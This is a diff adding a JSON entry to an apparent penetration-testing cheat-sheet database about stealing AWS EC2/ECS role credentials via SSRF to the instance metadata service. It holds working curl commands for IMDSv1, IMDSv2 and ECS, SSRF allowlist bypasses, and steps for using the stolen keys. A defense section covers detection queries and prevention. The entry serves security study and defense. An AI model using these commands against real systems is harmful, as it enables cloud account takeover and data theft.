@@ -1,0 +1,104 @@
+{
+  "id": "aws-imds-ssrf-creds",
+  "name": "AWS IMDS SSRF - Steal EC2/ECS Role Credentials",
+  "command": "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>",
+  "description": "Abuse a server-side request forgery (SSRF) primitive on an EC2 instance (or a direct shell) to reach the Instance Metadata Service at 169.254.169.254 and steal the temporary AWS credentials of the attached IAM role. IMDSv1 answers any GET; IMDSv2 requires a PUT to obtain a session token first (X-aws-ec2-metadata-token) which SSRF often cannot send.",
+  "platform": "multi",
+  "type": "command",
+  "opsec": "quiet",
+  "category": "Cloud Security",
+  "subcategory": "AWS Attacks",
+  "certifications": [
+    "OSCP"
+  ],
+  "primary_cert": "OSCP",
+  "source": "hackingthe.cloud",
+  "tags": [
+    "aws",
+    "imds",
+    "ssrf",
+    "ec2",
+    "ecs",
+    "credentials",
+    "169.254.169.254"
+  ],
+  "mitre": [
+    "T1552.005",
+    "T1078.004"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== WHAT YOU ARE AFTER ===\n  The link-local metadata endpoint 169.254.169.254 serves the temporary\n  STS credentials (AccessKeyId/SecretAccessKey/Token) of the instance role.\n\n=== IMDSv1 (direct GET - works through most SSRF) ===\n  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/\n  # that returns the role name, then:\n  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>\n  # JSON with AccessKeyId, SecretAccessKey, Token, Expiration\n\n=== IMDSv2 (token-first - needs a PUT, often blocks blind SSRF) ===\n  TOKEN=$(curl -s -X PUT \"http://169.254.169.254/latest/api/token\" \\\n    -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\")\n  curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" \\\n    http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>\n\n=== ECS TASK ROLE (containers) ===\n  # the task role creds URI is in an env var, fetched from 169.254.170.2\n  curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI\n\n=== USE THE STOLEN CREDS ===\n  export AWS_ACCESS_KEY_ID=...  AWS_SECRET_ACCESS_KEY=...  AWS_SESSION_TOKEN=...\n  aws sts get-caller-identity\n  aws s3 ls\n\n=== SSRF DELIVERY TRICKS (when a web app fetches a URL) ===\n  http://169.254.169.254/...            # direct\n  http://[::ffff:169.254.169.254]/...   # IPv6-mapped bypass\n  http://instance-data/latest/...       # alt hostname\n  # DNS-rebinding / redirect chains to defeat allowlists\n\n=== ALTERNATIVES / NEXT ===\n  Once you hold the role creds, enumerate with Pacu or pmapper.",
+  "examples": [
+    {
+      "label": "Enumerate IMDSv1 role then grab creds",
+      "command": "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ && echo && curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>"
+    },
+    {
+      "label": "IMDSv2 token-first fetch",
+      "command": "TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'); curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>"
+    },
+    {
+      "label": "Validate stolen creds",
+      "command": "aws sts get-caller-identity"
+    }
+  ],
+  "references": [
+    {
+      "title": "hackingthe.cloud - Steal EC2 metadata credentials via SSRF",
+      "url": "https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/"
+    },
+    {
+      "title": "AWS docs - Instance Metadata Service (IMDSv2)",
+      "url": "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "aws-pacu-enum",
+      "note": "Enumerate the account with the stolen role credentials.",
+      "rel": "next"
+    },
+    {
+      "id": "cloud-enumerate-iam",
+      "note": "Map what the stolen role can do.",
+      "rel": "next"
+    },
+    {
+      "id": "ssrf-exploit",
+      "note": "General SSRF exploitation to reach the metadata endpoint.",
+      "rel": "prereq"
+    }
+  ],
+  "defense": {
+    "why_it_works": "The IMDS endpoint 169.254.169.254 is reachable from any process on the instance and, with IMDSv1, answers unauthenticated GETs. A web app with SSRF can be coerced into making that GET and returning the role's temporary credentials.",
+    "prerequisites": "An SSRF primitive in an app running on EC2, or any code execution on the instance/container. IMDSv1 enabled (or an SSRF that can send the IMDSv2 PUT and custom header).",
+    "impact": "Theft of the instance/task IAM role's temporary credentials, giving the attacker every permission that role holds - frequently S3, DynamoDB, or further IAM reach leading to full account compromise.",
+    "detection": "[MITRE T1552.005] CloudTrail shows the role's temporary credentials being used from an IP outside the instance (sourceIPAddress not the instance ENI / not an AWS internal address), or API calls the role has never made before; GuardDuty raises UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS.",
+    "artifacts": "CloudTrail events with userIdentity.type=AssumedRole and the instance role's session name used from an external sourceIPAddress; VPC flow logs rarely show IMDS (link-local) but web-app logs show the SSRF request to 169.254.169.254.",
+    "splunk_spl": "index=aws sourcetype=aws:cloudtrail userIdentity.sessionContext.sessionIssuer.type=Role\n| search userIdentity.arn=\"*:assumed-role/*\"\n| stats values(eventName) dc(sourceIPAddress) as ips by userIdentity.arn\n| where ips>1",
+    "elastic_kql": "aws.cloudtrail.user_identity.type:\"AssumedRole\" and not source.ip:(10.0.0.0/8 or 172.16.0.0/12)",
+    "sentinel_kql": "AWSCloudTrail\n| where UserIdentityType == \"AssumedRole\"\n| where SourceIpAddress !startswith \"10.\" and SourceIpAddress !startswith \"172.\"\n| summarize Calls=count(), Events=make_set(EventName) by UserIdentityArn, SourceIpAddress",
+    "sigma_rules": "aws_instance_credential_use_outside_aws",
+    "prevention": "Enforce IMDSv2 and set HttpTokens=required and HttpPutResponseHopLimit=1 on every instance; block egress to 169.254.169.254 from app runtimes that do not need it; scope instance roles to least privilege; enable GuardDuty InstanceCredentialExfiltration detection; fix the SSRF (allowlist outbound hosts, deny link-local ranges).",
+    "sources": [
+      "https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/",
+      "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html"
+    ],
+    "detections": [
+      {
+        "platform": "splunk",
+        "name": "Instance role credentials used from outside AWS",
+        "logic": "index=aws sourcetype=aws:cloudtrail userIdentity.type=AssumedRole\n| stats dc(sourceIPAddress) as srcips values(eventName) as events by userIdentity.arn\n| where srcips>1",
+        "data_source": "cloud-trail",
+        "attack": [
+          "T1552.005",
+          "T1078.004"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium",
+        "false_positives": "NAT changes or legitimate use of role creds from multiple instances behind one egress IP",
+        "tuning": "Baseline each instance role's normal source IPs and alert on new external IPs; correlate with GuardDuty InstanceCredentialExfiltration"
+      }
+    ]
+  }
+}
